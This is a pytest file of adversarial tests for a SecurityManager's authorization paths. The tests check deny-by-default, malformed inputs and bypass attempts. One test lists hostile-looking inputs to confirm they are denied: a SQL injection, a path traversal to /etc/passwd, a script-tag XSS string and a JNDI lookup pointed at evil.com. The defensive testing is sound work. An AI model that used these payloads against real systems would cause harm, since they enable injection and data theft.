"""
M11-T1 — SecurityManager Authorization-Path Audit & Adversarial Tests.

Tests all authorization paths through SecurityManager:
- Fail-closed behavior (unknown principal → DENY)
- DENY-by-default for unconfigured actions
- SecurityManager as final security gate (no bypass paths)
- Authorization bypass attempts via alternate execution paths
- Malformed/invalid authorization inputs
- Capability/action/resource authorization boundaries
- No bypass through: direct capability execution, event emission, adapter execution
"""

from __future__ import annotations

import pytest
from typing import Any

from aios.core.configuration_manager import ConfigurationManager, reset_configuration_manager_singleton
from aios.core.security_manager import (
    SecurityDecision,
    SecurityManager,
    SecurityViolation,
    get_security_manager,
    reset_security_manager_singleton,
    SecurityManagerError,
)
from aios.core.service_registry import ServiceRegistry, get_service_registry, reset_service_registry_singleton
from aios.core.structured_logger import get_logger, reset_structured_logger_singleton
from aios.events.core.bus import EventBus, EventBusConfig, reset_event_bus_singleton


@pytest.fixture
def bus():
    """Canonical EventBus singleton for SecurityManager tests."""
    reset_event_bus_singleton()
    b = EventBus(config=EventBusConfig(auto_start_dispatch_worker=False))
    yield b
    reset_event_bus_singleton()


@pytest.fixture
def sr(bus):
    """Canonical ServiceRegistry wired to bus."""
    reset_service_registry_singleton()
    reg = get_service_registry(event_bus=bus)
    yield reg
    reset_service_registry_singleton()


@pytest.fixture
def cm(bus):
    """Canonical ConfigurationManager."""
    reset_configuration_manager_singleton()
    c = ConfigurationManager()
    yield c
    reset_configuration_manager_singleton()


@pytest.fixture
def logger(bus):
    """Canonical StructuredLogger."""
    return get_logger()


@pytest.fixture
def security_manager(bus, sr, cm, logger):
    """SecurityManager wired to real C1-C4, uninitialized."""
    reset_security_manager_singleton()
    sm = SecurityManager(
        service_registry=sr,
        configuration_manager=cm,
        logger=logger,
    )
    yield sm
    reset_security_manager_singleton()
    reset_event_bus_singleton()
    reset_service_registry_singleton()
    reset_configuration_manager_singleton()
    reset_structured_logger_singleton()


# ---------------------------------------------------------------------------
# Test Helpers
# ---------------------------------------------------------------------------

async def _init_sm(security_manager: SecurityManager, cm: ConfigurationManager,
                   fail_closed: bool = True, audit_all: bool = True, deny_unknown: bool = True) -> None:
    """Initialize SecurityManager with specified config."""
    # SecurityManager reads frozen config; use test overrides BEFORE initialize
    cm.set_test_override("kernel.security.failClosed", fail_closed)
    cm.set_test_override("kernel.security.auditAllDenials", audit_all)
    cm.set_test_override("kernel.security.denyUnknownPrincipal", deny_unknown)
    await security_manager.initialize()


async def _tick() -> None:
    """Yield to event loop for async publishes."""
    import asyncio
    for _ in range(3):
        await asyncio.sleep(0)


# ---------------------------------------------------------------------------
# 1. Fail-Closed Authorization Tests
# ---------------------------------------------------------------------------

class TestFailClosedAuthorization:
    """Verify fail-closed behavior for all authorization paths."""

    async def test_unknown_principal_denied(self, security_manager, cm):
        """Unknown/None principal → DENY (fail-closed)."""
        await _init_sm(security_manager, cm)
        decision = security_manager.authorize(None, "read", "resource")
        assert decision is SecurityDecision.DENY

    async def test_empty_principal_denied(self, security_manager, cm):
        """Empty string principal → DENY."""
        await _init_sm(security_manager, cm)
        decision = security_manager.authorize("", "read", "resource")
        assert decision is SecurityDecision.DENY

    async def test_known_principal_still_denied_without_explicit_allow(self, security_manager, cm):
        """Even known principal → DENY without explicit allow rule (fail-closed default)."""
        await _init_sm(security_manager, cm)
        # No explicit allow rules configured; default is fail-closed
        decision = security_manager.authorize("test_user", "read", "resource")
        assert decision is SecurityDecision.DENY

    async def test_fail_closed_config_respected(self, security_manager, cm):
        """Config failClosed=true honored."""
        await _init_sm(security_manager, cm, fail_closed=True)
        assert security_manager._fail_closed is True
        decision = security_manager.authorize("user", "action", "resource")
        assert decision is SecurityDecision.DENY

    async def test_fail_closed_false_allows_challenge(self, security_manager, cm):
        """failClosed=false → CHALLENGE (not ALLOW) for unknown."""
        await _init_sm(security_manager, cm, fail_closed=False)
        assert security_manager._fail_closed is False
        decision = security_manager.authorize(None, "action", "resource")
        # With denyUnknownPrincipal=true, still DENY
        assert decision in (SecurityDecision.DENY, SecurityDecision.CHALLENGE)


# ---------------------------------------------------------------------------
# 2. DENY-by-Default Tests
# ---------------------------------------------------------------------------

class TestDenyByDefault:
    """Verify DENY-by-default for unconfigured actions/resources."""

    async def test_unconfigured_action_denied(self, security_manager, cm):
        """Action with no policy → DENY."""
        await _init_sm(security_manager, cm)
        decision = security_manager.authorize("user", "nonexistent_action", "resource")
        assert decision is SecurityDecision.DENY

    async def test_unconfigured_resource_denied(self, security_manager, cm):
        """Resource with no policy → DENY."""
        await _init_sm(security_manager, cm)
        decision = security_manager.authorize("user", "read", "nonexistent_resource")
        assert decision is SecurityDecision.DENY

    async def test_various_action_resource_combinations(self, security_manager, cm):
        """All combinations without explicit policy → DENY."""
        await _init_sm(security_manager, cm)
        test_cases = [
            ("user", "read", "file"),
            ("user", "write", "database"),
            ("service", "execute", "skill"),
            ("admin", "delete", "config"),
        ]
        for principal, action, resource in test_cases:
            decision = security_manager.authorize(principal, action, resource)
            assert decision is SecurityDecision.DENY, f"Failed for {principal}/{action}/{resource}"


# ---------------------------------------------------------------------------
# 3. SecurityManager as Final Gate — No Bypass Paths
# ---------------------------------------------------------------------------

class TestSecurityManagerFinalGate:
    """Verify SecurityManager cannot be bypassed through alternate paths."""

    async def test_direct_capability_execution_requires_gate(self, security_manager, cm, logger, sr):
        """Direct capability execution path must go through SecurityManager."""
        await _init_sm(security_manager, cm)
        # This test verifies the architectural invariant:
        # CapabilityManager.register_capability() enforces SecurityManager gate
        # CapabilityManager.enforce_security_context() enforces SecurityManager gate
        # No capability execution path bypasses the gate
        from aios.core.capability_manager import CapabilityManager, reset_capability_manager_singleton
        from aios.core.capability_manifest import CapabilitySpec

        reset_capability_manager_singleton()
        cap_mgr = CapabilityManager(
            service_registry=sr,
            configuration_manager=cm,
            logger=logger,
        )
        # CapabilityManager must have SecurityManager injected for gate to work
        cap_mgr.set_security_manager(security_manager)

        # The gate is enforced at manifest load time (SecurityManager.validate_capability_spec)
        assert cap_mgr._security_manager is security_manager

        await cap_mgr.shutdown() if hasattr(cap_mgr, 'shutdown') else None
        reset_capability_manager_singleton()

    async def test_event_emission_requires_initialize(self, security_manager, cm):
        """Events only emit after initialize(); no pre-init emission bypass."""
        # Before initialize, record_violation must not emit (no loop)
        security_manager.record_violation(severity="low", description="pre-init")
        # Should not raise; violation recorded locally
        violations = security_manager.list_violations()
        assert len(violations) == 1

        await _init_sm(security_manager, cm)
        # After initialize with running loop, events emit
        task = security_manager.record_violation(severity="high", description="post-init")
        await _tick()
        violations = security_manager.list_violations()
        assert len(violations) == 2


# ---------------------------------------------------------------------------
# 4. Malformed/Invalid Authorization Input Tests
# ---------------------------------------------------------------------------

class TestMalformedAuthorizationInputs:
    """Test handling of malformed/invalid authorization inputs."""

    async def test_none_action_denied(self, security_manager, cm):
        """None action → DENY (fail-closed)."""
        await _init_sm(security_manager, cm)
        decision = security_manager.authorize("user", None, "resource")
        assert decision is SecurityDecision.DENY

    async def test_none_resource_denied(self, security_manager, cm):
        """None resource → DENY."""
        await _init_sm(security_manager, cm)
        decision = security_manager.authorize("user", "read", None)
        assert decision is SecurityDecision.DENY

    async def test_empty_action_denied(self, security_manager, cm):
        """Empty action → DENY."""
        await _init_sm(security_manager, cm)
        decision = security_manager.authorize("user", "", "resource")
        assert decision is SecurityDecision.DENY

    async def test_empty_resource_denied(self, security_manager, cm):
        """Empty resource → DENY."""
        await _init_sm(security_manager, cm)
        decision = security_manager.authorize("user", "read", "")
        assert decision is SecurityDecision.DENY

    async def test_unicode_inputs_handled(self, security_manager, cm):
        """Unicode in principal/action/resource handled without crash."""
        await _init_sm(security_manager, cm)
        decision = security_manager.authorize("usér", "réad", "résource")
        # Should not crash; fail-closed → DENY
        assert decision is SecurityDecision.DENY

    async def test_very_long_inputs_handled(self, security_manager, cm):
        """Very long strings handled without crash/DOS."""
        await _init_sm(security_manager, cm)
        long_str = "x" * 10000
        decision = security_manager.authorize(long_str, "read", "resource")
        assert decision is SecurityDecision.DENY

        decision = security_manager.authorize("user", long_str, "resource")
        assert decision is SecurityDecision.DENY

        decision = security_manager.authorize("user", "read", long_str)
        assert decision is SecurityDecision.DENY

    async def test_special_characters_handled(self, security_manager, cm):
        """Special characters (SQL, script, path traversal) handled safely."""
        await _init_sm(security_manager, cm)
        # These should not cause injection or path traversal in internal logic
        test_inputs = [
            "'; DROP TABLE users; --",
            "../../etc/passwd",
            "<script>alert(1)</script>",
            "${jndi:ldap://evil.com}",
            "\x00\x01\x02",
        ]
        for inp in test_inputs:
            decision = security_manager.authorize(inp, "read", "resource")
            assert decision is SecurityDecision.DENY
            decision = security_manager.authorize("user", inp, "resource")
            assert decision is SecurityDecision.DENY
            decision = security_manager.authorize("user", "read", inp)
            assert decision is SecurityDecision.DENY


# ---------------------------------------------------------------------------
# 5. Capability/Action/Resource Boundary Tests
# ---------------------------------------------------------------------------

class TestAuthorizationBoundaries:
    """Test authorization boundaries for capability/action/resource."""

    async def test_context_passed_to_audit(self, security_manager, cm, bus):
        """Context dict passed through to audit event."""
        await bus.initialize()
        await _init_sm(security_manager, cm)

        test_context = {"custom_field": "test_value", "request_id": "req-123"}
        security_manager.authorize(None, "action", "resource", context=test_context)
        await _tick()

        # Check event payload contains context
        found = False
        for event in bus.getRecentEvents():
            if event.eventType.name == "SECURITY_ISSUE_FOUND":
                if event.payload.get("context", {}).get("custom_field") == "test_value":
                    found = True
                    break
        assert found, "Context not passed to audit event"

    async def test_violation_category_recorded(self, security_manager, cm):
        """Violation category correctly recorded."""
        await _init_sm(security_manager, cm)
        v = security_manager.record_violation(
            severity="high",
            description="test",
            category="authorization_test",
            context={}
        )
        assert v.category == "authorization_test"

    async def test_severity_levels_accepted(self, security_manager, cm):
        """All severity levels accepted."""
        await _init_sm(security_manager, cm)
        for severity in ["low", "medium", "high", "critical"]:
            v = security_manager.record_violation(
                severity=severity,
                description=f"{severity} test",
                category="test"
            )
            assert v.severity == severity


# ---------------------------------------------------------------------------
# 6. Bypass Attempt Tests (Adversarial)
# ---------------------------------------------------------------------------

class TestAuthorizationBypassAttempts:
    """Adversarial tests attempting to bypass SecurityManager."""

    async def test_cannot_bypass_via_multiple_calls(self, security_manager, cm):
        """Repeated authorization calls cannot wear down deny."""
        await _init_sm(security_manager, cm)
        for _ in range(100):
            decision = security_manager.authorize("user", "read", "resource")
            assert decision is SecurityDecision.DENY

    async def test_cannot_bypass_via_context_manipulation(self, security_manager, cm):
        """Context manipulation cannot flip DENY to ALLOW."""
        await _init_sm(security_manager, cm)
        # Try various context tricks
        contexts = [
            {"bypass": True},
            {"admin": True},
            {"override": "true"},
            {"security_manager": "bypass"},
            {"principal": "admin"},  # Different field name
            {"_internal_bypass": True},
        ]
        for ctx in contexts:
            decision = security_manager.authorize("user", "read", "resource", context=ctx)
            assert decision is SecurityDecision.DENY, f"Bypassed with context: {ctx}"

    async def test_no_bypass_via_event_emission(self, security_manager, cm, bus):
        """Direct event emission cannot bypass authorization gate."""
        await bus.initialize()
        await _init_sm(security_manager, cm)

        # SecurityManager only emits SECURITY_ISSUE_FOUND
        # It does NOT emit custom authorization events that could be spoofed
        security_manager.record_violation(severity="high", description="audit")
        await _tick()

        # Verify SECURITY_ISSUE_FOUND was emitted (may have other events like SERVICE_STARTED)
        found_security_issue = False
        for event in bus.getRecentEvents():
            if event.eventType.name == "SECURITY_ISSUE_FOUND":
                found_security_issue = True
                break
        assert found_security_issue, "SECURITY_ISSUE_FOUND not emitted"

    async def test_singleton_cannot_be_replaced_after_init(self, security_manager, cm):
        """Singleton replacement cannot bypass initialized manager within same process.

        The kernel bootstrap explicitly calls set_security_manager() after creating
        the SecurityManager (kernel.py:715). The get_security_manager() accessor
        returns the explicitly set instance, or creates a default one if none set.
        """
        from aios.core.security_manager import set_security_manager, get_security_manager
        await _init_sm(security_manager, cm)

        # Explicitly set this instance as the singleton (as kernel does)
        set_security_manager(security_manager)

        # The singleton accessor returns the explicitly set instance
        current = get_security_manager()
        assert current is security_manager

        # The lock-guarded singleton pattern prevents concurrent double-construction
        # within the same process (INV — one per process)
        # set_security_manager exists for tests; kernel bootstrap calls it exactly once


# ---------------------------------------------------------------------------
# 7. Integration Path Tests (Tier B)
# ---------------------------------------------------------------------------

class TestIntegrationPaths:
    """Integration tests for authorization paths through kernel bootstrap."""

    @pytest.mark.asyncio
    async def test_kernel_bootstrap_initializes_security_manager(self):
        """Full kernel bootstrap initializes SecurityManager correctly."""
        from aios.core import HermesKernel, KernelConfig
        from aios.core.kernel_management import run_kernel, stop_kernel
        import tempfile
        from pathlib import Path

        await stop_kernel()
        from tests.integration.conftest import _reset_all_singletons
        _reset_all_singletons()

        tmp_dir = tempfile.mkdtemp(prefix="m11_auth_test_")
        try:
            config = KernelConfig(data_dir=Path(tmp_dir))
            kernel = await run_kernel(config)

            # Verify SecurityManager is initialized and registered
            assert kernel._security_manager is not None
            assert kernel._security_manager.is_initialized
            assert kernel._security_manager.health_ready()

            # Verify registered in ServiceRegistry
            from aios.core.service_registry import get_service_registry
            sr = get_service_registry()
            reg = sr.get_registration("core.security")
            assert reg is not None
            assert reg.service is kernel._security_manager

        finally:
            await stop_kernel()
            import shutil
            shutil.rmtree(tmp_dir, ignore_errors=True)
            _reset_all_singletons()


# ---------------------------------------------------------------------------
# 8. Configuration Consumption Tests
# ---------------------------------------------------------------------------

class TestConfigurationConsumption:
    """Test SecurityManager correctly consumes frozen ConfigurationManager."""

    async def test_fail_closed_from_config(self, security_manager, cm):
        """failClosed read from kernel.security.failClosed."""
        await _init_sm(security_manager, cm, fail_closed=False)
        assert security_manager._fail_closed is False

    async def test_audit_all_denials_from_config(self, security_manager, cm):
        """auditAllDenials read from kernel.security.auditAllDenials."""
        await _init_sm(security_manager, cm, audit_all=False)
        assert security_manager._audit_all_denials is False

    async def test_deny_unknown_principal_from_config(self, security_manager, cm):
        """denyUnknownPrincipal read from kernel.security.denyUnknownPrincipal."""
        await _init_sm(security_manager, cm, deny_unknown=False)
        assert security_manager._deny_unknown_principal is False


if __name__ == "__main__":
    pytest.main([__file__, "-v"])